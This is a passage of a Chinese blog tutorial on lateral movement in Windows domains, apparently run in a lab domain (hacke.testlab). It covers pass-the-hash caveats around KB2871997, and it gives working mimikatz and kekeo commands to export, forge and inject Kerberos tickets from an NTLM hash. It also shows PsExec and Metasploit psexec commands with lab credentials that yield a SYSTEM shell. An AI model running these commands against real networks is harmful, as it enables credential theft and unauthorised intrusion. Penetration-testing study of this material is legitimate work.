+<li>如果安装了KB2871997,仍然可以使用SID为500的用户的NTLMHash进行哈希传递</li>
+<li>使用mimikatz哈希传递功能，需要具备本地管理员权限。这是由mimikatz的实现机制决定的（需要高权限进程lsass.exe的执行权限）</li>
+</ul>
+<h5 id="KB2871997补丁影响"><a href="#KB2871997补丁影响" class="headerlink" title="KB2871997补丁影响"></a>KB2871997补丁影响</h5><p>KB2871997补丁的作用是禁止通过本地管理员权限与远程计算机进行连接，因此安装本补丁时，本地管理员权限无法对远程计算机使用PsExec、WMI、smbexec、schtasks、at,也无法访问远程主机的文件共享等</p>
+<p>更新KB2871997补丁后，无法使用常规的哈希传递方法进行横向移动，但Aadministrator账号(SID为500)例外，使用该账号的散列值依旧可以进行哈希传递。</p>
+<p>SID为500的账号。在一些计算机中即使将administrator账号改名，也不会影响SID的值。因此使用SID为500的账号进行横向移动，就不会受到KB2871997的影响</p>
+<h4 id="0x04票据传递"><a href="#0x04票据传递" class="headerlink" title="0x04票据传递"></a>0x04票据传递</h4><p>要想使用mimikatz的哈希传递功能，需要具备本地管理员权限，mimikatz提供了不需要本地管理员全新进行横向渗透的方法，如<code>票据传递（Pass The Ticket, PTT）</code></p>
+<h5 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="使用mimikatz进行票据传递"></a>使用mimikatz进行票据传递</h5><p>使用<code>mimikatz</code>可以将内存中的票据导出。导出命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/24.png" alt></p>
+<p>执行票据导出命令后，会在当前目录下出现多个服务的<code>票据文件，如krbtgt、cifs、ldap</code>等，使用mimikatz清楚内存中的票据,随之将票据文件注入内存，将高权限的票据文件注入内存后，可列出远程计算机系统的文件目录命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt &quot;C:\ticket\[0;59f88]-2-0-60a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi&quot;</span><br><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/25.png" alt></p>
+<p><img src="/2020/06/27/域内横向移动一/26.png" alt></p>
+<h5 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h5><p>票据传递也可以使用<code>kekeo</code>工具来实现，下载地址：<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
+<p><code>kekeo</code>需要使用<code>域名、用户名、NTLMHash</code>三者配合生成票据，再将票据导入，从而直接连接远程计算机</p>
+<p>实验环境</p>
+<ul>
+<li>域名：hacke.testlab</li>
+<li>用户名:administrator</li>
+<li>NTLM Hash：09bc0266e773764dc3606744ddbe133d</li>
+</ul>
+<p>在目标机器中输入命令，运行kekeo,在当前目录下生成一个票据文件，票据文件为<code>TGT_administrator@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi</code>。如图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:administrator /domain:hacke.testlab /ntlm:09bc0266e773764dc3606744ddbe133d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/27.png" alt></p>
+<p>在kekeo中清除当前内存中的其他票据（否则可能导致票据传递失败）,在windows命令运行环境中执行系统自带的命令，也可以清除内存中的票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/28.png" alt></p>
+<p>使用<code>kekeo</code>将票据文件导入内存,将票据文件导入内存后，使用exit 命令退出<code>kekeo</code>使用dir命令，列出远程主机中的文件命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_administrator@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/29.png" alt></p>
+<p>需要注意的是：</p>
+<ul>
+<li>dir命令，是主机，不要使用ip地址</li>
+<li>票据文件注入的默认有效时间是10小时</li>
+<li>目标机器上不需要本地管理员权限即可进行票据传递</li>
+</ul>
+<h4 id="PsExec的使用"><a href="#PsExec的使用" class="headerlink" title="PsExec的使用"></a>PsExec的使用</h4><p>PsExec可以在windows vista/Nt 4.0/2000/XP/Server 2003/Server 2008/Server 2012/Server 2016包含64位版本上运行</p>
+<h5 id="PsTools工具包中的PsExec"><a href="#PsTools工具包中的PsExec" class="headerlink" title="PsTools工具包中的PsExec"></a>PsTools工具包中的PsExec</h5><p>PsExec包含在PsTools工具包中，下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip。通过PsExec,可以在远程计算机上执行命令，可以将管理员权限提升到system权限以运行执行的程序。" target="_blank" rel="noopener">https://download.sysinternals.com/files/PSTools.zip。通过PsExec,可以在远程计算机上执行命令，可以将管理员权限提升到system权限以运行执行的程序。</a></p>
+<p>PsExec原理：</p>
+<p>通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为<code>PSEXESVC</code>的二进制文件，之后，通过psexec服务运行命令，运行结束后删除服务。</p>
+<p>获取目标操作系统的交互式shell,在建立<code>ipc$</code>的情况下，执行如下命令，可以获取system权限的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.3\ipc$ &quot;Admin!@#$4321&quot; /user:administrator</span><br><span class="line">PsExec.exe -accepteula \\192.168.1.3 -s cmd.exe</span><br><span class="line">PsExec.exe -accepteula \\192.168.1.3 cmd.exe</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/30.png" alt></p>
+<p>在没有建立<code>ipc$``PsExec</code>有两个参数可以通过指定账号和密码进行远程连接，注意这里用户名前面要加域，不然会提示<code>登录失败: 未知的用户名或错误密码</code></p>
+<ul>
+<li>-u:域\用户名</li>
+<li>-p:密码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.1.2 -u administrator -p Admin!@#$4321 cmd.exe</span><br><span class="line">PsExec.exe \\192.168.1.2 -u HACKE\administrator -p Admin!@#$4321 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/31.png" alt></p>
+<p>使用PsExec时，需要注意：</p>
+<ul>
+<li>需要远程系统开启admin$共享（默认是开启的）</li>
+<li>在使用ipc$连接目标系统后，不需要输入账号和密码</li>
+<li>使用PsExec执行命令时，由于创建或删除服务时会产生大量的日志，可通过日志反推攻击</li>
+<li>使用PsExec可以直接获得system权限的交互式shell</li>
+</ul>
+<h5 id="metasploit中的psexec模块"><a href="#metasploit中的psexec模块" class="headerlink" title="metasploit中的psexec模块"></a>metasploit中的psexec模块</h5><p>使用命令进行搜索，然后输入对应的使用命令，这里测试的时候没成，暂时不知道原因…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search psexec</span><br><span class="line">set rhost 192.168.1.2</span><br><span class="line">set smbuser administrtaor</span><br><span class="line">set smbpass Admin!@#$4321</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/27/域内横向移动一/32.png" alt></p>
+<p>psexec_pth模块和psexec模块的使用方法相同，psexec_pth模块上传的饿payload是powershell版本的。</p>
+</div><!--文章标签--><div class="tags"></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">20</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/cobaltstrike/" style="font-size: 14px;">cobaltstrike</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/27/域内横向移动一/">域内横向移动一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/15/权限提升分析及防御二/">权限提升分析及防御二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/11/权限提升分析及防御一/">权限提升分析及防御一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/08/IntelliJ-IDEA修改cobaltstrike/">IntelliJ-IDEA修改cobaltstrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/利用msf自带的route模块穿透目标内网/">利用msf自带的route模块穿透目标内网</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/使用Venom搭建二级代理/">使用Venom搭建二级代理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/隐藏通信隧道技术二/">隐藏通信隧道技术二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/隐藏通信隧道技术/">隐藏通信隧道技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/18/Mac配置PyQt5-pyCharm并使用/">Mac配置PyQt5+pyCharm并使用</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
